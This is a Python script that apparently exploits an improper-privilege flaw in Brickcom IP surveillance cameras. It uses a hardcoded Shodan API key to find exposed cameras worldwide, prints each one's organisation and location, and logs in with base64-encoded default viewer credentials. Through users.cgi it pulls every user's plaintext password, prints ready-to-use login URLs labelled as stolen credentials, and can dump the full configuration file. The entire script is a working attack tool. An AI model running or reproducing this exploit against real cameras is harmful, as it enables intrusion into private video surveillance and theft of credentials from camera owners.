#/usr/bin/python
# -*- coding:utf-8 -*-
# Developement by @DreadPirateRobertt > github.com/Luth1er 


from requests.auth import HTTPBasicAuth
import requests, os, shodan, time,sys
import urllib2
import argparse
import base64
global Animation, fastprint

#os.system('cls')

class Lab_Collors():
    vermelho = '\033[31m'
    verde = '\033[32m'
    azul = '\033[34m'
    ciano = '\033[36m'
    purple = '\033[35m'
    amarelo = '\033[33m'
    preto = '\033[30m'
    branco = '\033[37m'
    original = '\033[0;0m'

	

def Animation(String, color):
    animation = "|/-\\"
    for i in range(11):
        time.sleep(0.1)
        sys.stdout.write("\r" + "[" + animation[i % len(animation)] + "]" + color + String)
        sys.stdout.flush()
    print('')


def fastprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush() # defeat buffering
        time.sleep(1./50)

#print Lab_Collors.azul+Lab_Banners.Bulls
print ''
print Lab_Collors.ciano+"[*] Args: "
print ''
print Lab_Collors.branco+"Brickcom.py --shodan search"
print Lab_Collors.branco+"Brickcom.py --cam 192.168.0.1:8080 --export configFile.txt"
print ''

parser = argparse.ArgumentParser(description='Brickcom Survilance Private System - Impropper Privilege viewer Control')
parser.add_argument('-c','--cam', action='store',help='--cam  -  set u cam ip:port')
parser.add_argument('-e','--export', action='store',help='--export  -  Export/Save Config File')
parser.add_argument('-s','--shodan', action='store',help='--shodan  -  Crawlling IPS by Shodan Advanced Search Enginnering')
args = parser.parse_args()



def Banner(_ip,_port,privilegeUser,stolenCredentials):
	_banner = '''
[+] BRICKCOM - [IP_CAM] Private Survilance
[+] IP:   {}
[+] PORT: {}
[+] load: {}

[+] Credentials Stolen Information

{}

[+] Access: http://{}:{}
	'''.format(_ip, _port, privilegeUser, stolenCredentials, _ip, _port)
	#print _banner
	print Lab_Collors.vermelho+"[-] IP: "  + Lab_Collors.verde + _ip
	print Lab_Collors.vermelho+"[-] PORT: " +Lab_Collors.verde+ _port
	print Lab_Collors.amarelo+"[-] load: " + Lab_Collors.amarelo+privilegeUser
	print Lab_Collors.azul+"\n[+] Credentials Stolen Information\n"
	print Lab_Collors.azul+stolenCredentials
	GetCredentials(_ip, _port, stolenCredentials)
	#read exist credentials

	#_rf = open('CredentialsStolen.txt','r').readlines()
	#if _ip in _rf:
	#	print "[+] This server already saved at this database"
	#else:
	#	# save credentials 
	#	_fl = open('CredentialsStolen.txt','a+')
	#	_fl.writelines(_banner+'\n')
	#	_fl.close()



def GetCredentials(_ip, _port, stolenCredentials):
	_username1 = []
	_passwd1 = []
	_username4 = []
	_passwd4 = []
	_username5 = []
	_passwd5 = []
	_username6 = []
	_passwd6 = []
	var = stolenCredentials.split('\n')
	for line in  var:

		if "User1" in line:
			if "User1.username=" in line:
				_username = line.split('=')
				_username1.append(_username[1])
			if "User1.password=" in line:
				_passwd = line.split('=')
				_passwd1.append(_passwd[1])
		elif "User4" in line:
			if "User4.username=" in line:
				_username = line.split('=')
				_username4.append(_username[1])
			if "User4.password=" in line:
				_passwd = line.split('=')
				_passwd4.append(_passwd[1])
		elif "User5" in line:
			if "User5.username=" in line:
				_username = line.split('=')
				_username5.append(_username)
			if "User5.password=" in line:
				_passwd = line.split('=')
				_passwd5.append(_passwd[1])
		elif "User6" in line:
			if "User6.username=" in line:
				_username = line.split('=')
				_username6.append(_username)
			if "User6.password=" in line:
				_passwd = line.split('=')
				_passwd6.append(_passwd[1])

	print Lab_Collors.verde+"\n[+] Access: "+Lab_Collors.purple+"http://{}:{}@{}:{}".format(_username1[0],_passwd1[0],_ip, _port)


	if _username4 == []:
		pass
	else:
		try:
			print Lab_Collors.verde+"\n[+] Access: "+Lab_Collors.purple+"http://{}:{}@{}:{}".format(_username4[0],_passwd4[0],_ip, _port)
		except:
			pass
	if _username5 == []:
		pass
	else:
		try:
			print Lab_Collors.verde+"\n[+] Access: "+Lab_Collors.purple+"http://{}:{}@{}:{}".format(_username5[0],_passwd5[0],_ip, _port)
		except:
			pass
	if _username6 == []:
		pass
	else:
		try:
			print Lab_Collors.verde+"\n[+] Access: "+Lab_Collors.purple+"http://{}:{}@{}:{}".format(_username6[0],_passwd6[0],_ip, _port)
		except:
			pass


def ExportConfig(stolenCredentials, _cam, _save):
	_cfg_username = []
	_cfg_passwd = []
	var = stolenCredentials.split('\n')
	for line in  var:
		if "User1" in line:
			if "User1.username=" in line:
				_username = line.split('=')
				_cfg_username.append(_username[1])
			if "User1.password=" in line:
				_passwd = line.split('=')
				_cfg_passwd.append(_passwd[1])

	url = 'http://'+_cam+'/configfile.dump?action=get'

	passman = urllib2.HTTPPasswordMgrWithDefaultRealm()
	# this creates a password manager
	passman.add_password(None, 	url, _cfg_username[0], _cfg_passwd[0])
	# put None at the start it will always
	# use username/password for u HTTPAuthentication

	authhandler = urllib2.HTTPBasicAuthHandler(passman)
	# create the AuthHandler

	opener = urllib2.build_opener(authhandler)

	urllib2.install_opener(opener)
	# All calls to urllib2.urlopen will now use our handler
	# Make sure not to include the protocol in with the URL, or
	# HTTPPasswordMgrWithDefaultRealm will be very confused.
	# You must (of course) use it when fetching the page though.

	pagehandle = urllib2.urlopen(url)
	# authentication is now handled automatically for us
	read = pagehandle.read()
	print read

	_saved = open(_save, 'w')
	_saved.writelines(read)
	_saved.close()

def ImpropperControlPrivilege(_cam):

	_split = _cam.split(':')
	_ip    = _split[0]
	_port  = _split[1]

	try:
		# HTTP Auth with impropper default getUser privilege
		_code = requests.get('http://' + _cam + '/cgi-bin/users.cgi?action=getUsers', auth=HTTPBasicAuth(base64.b64decode('dmlld2Vy'), base64.b64decode('dmlld2Vy')))
		if _code.status_code == 200:                                                                     #User2.privilege=0
			print ''
			Animation(" HTTPAuth - Exploit", Lab_Collors.branco)
			print ''
			Banner(_ip, _port, "User2.privilege=0", _code.text)
			return _code.text
		elif _code.status_code >= 400: 
			_code = requests.get('http://' + _cam + '/cgi-bin/users.cgi?action=getUsers', auth=HTTPBasicAuth(base64.b64decode('cnZpZXdlcg=='), base64.b64decode('cnZpZXdlcg==')))
			if _code.status_code == 200:                                                                      #User3.privilege=2
				print ''
				Animation(" 2 HTTPAuth - User3: 2 priv", Lab_Collors.amarelo)
				print ''
				Banner(_ip, _port, "User3.privilege=2", _code.text)
				return _code.text
			else:
				print ""
				print Lab_Collors.vermelho+"[!] {} - Can't Exploit Access This Server".format(_cam)
	except Exception as Error:
		print Lab_Collors.vermelho+"[+] "+str(Error)


#ImpropperControlPrivilege(_survilance)


def ShodanCrawller():
	# Shodan crawller here
	# shodan api + crawling
	#os.system("rm -f result.csv 2&>/dev/null") # remove olders results if exist
	model = 'Brickcom'
	Animation(" Shodan Crawlling IPS", Lab_Collors.amarelo)
	file = 'result.txt' # file to save shodan results
	try:

		key = 'EJV3A4Mka2wPs7P8VBCO6xcpRe27iNJu'
		api = shodan.Shodan(key) # conf api
		query = model # format query
		result = api.search(query) # search var
		count = 0
		for service in result['matches']:
			ips = service['ip_str']	# format output
			#os.system("echo - > results.csv") # new result file
			#print service
			_access = str(ips)+":"+str(service['port'])
			#print _access
			print ''
			Animation(" BRICKCOM - [IP_CAM] Private Survilance", Lab_Collors.purple)
			print ''
			_organization = service['org']
			_isp = service['isp']
			print Lab_Collors.vermelho+"[-] Organization: ", Lab_Collors.verde+_organization, "-", _isp
			_country     = str(service['location']['country_name'])+" ("+str(service['location']['country_code'])+")"
			print Lab_Collors.vermelho+"[-] Country: "+Lab_Collors.verde+_country
			
			_city    = service['location']['city']
			if _city == None:
				print Lab_Collors.vermelho+"[-] City: None" 
			else: print Lab_Collors.vermelho+"[-] City: "+Lab_Collors.verde+_city
			
			_postal_code = str(service['location']['postal_code'])
			_region_code = str(service['location']['region_code'])
			print Lab_Collors.vermelho+"[-] Postal Code: " + Lab_Collors.verde+_postal_code + Lab_Collors.vermelho+"  Region Code: " +  Lab_Collors.verde+_region_code

			_Hostnames = service['hostnames']
			for host in _Hostnames:
				print Lab_Collors.vermelho+"[-] Hostnames: ", Lab_Collors.verde+host
			_domains   = service['domains']
			for domain in _domains:
				print Lab_Collors.vermelho+"[-] Domains: ", Lab_Collors.verde+domain

			_latitude  = str(service['location']['latitude'])
			_longitude = str(service['location']['longitude']) 
			_id = service['_shodan']['id']

			print Lab_Collors.vermelho+"[!] Lat: "+Lab_Collors.verde+_latitude+Lab_Collors.vermelho+" Long:"+Lab_Collors.verde+_longitude
			print Lab_Collors.vermelho+"[-] ID: ", Lab_Collors.verde+_id

			ImpropperControlPrivilege(_access)
			print ''
			raw_input(Lab_Collors.vermelho+'[!] Enter to Skip')
			#save = open(file, 'w') # save the result
			#save.write(ips)
			#save.close

			#shodan_crack()

	except Exception as error:
		print('[-] Error: %s' % (error))
		time.sleep(2)
		sys.exit()
# end shodan

#ShodanCrawller()


def main():
	if args.shodan:
		ShodanCrawller()
	if args.cam and args.export:
		_stolen = ImpropperControlPrivilege(args.cam)
		time.sleep(3)
		ExportConfig(_stolen, args.cam, args.export)

if __name__ == '__main__':
	main()
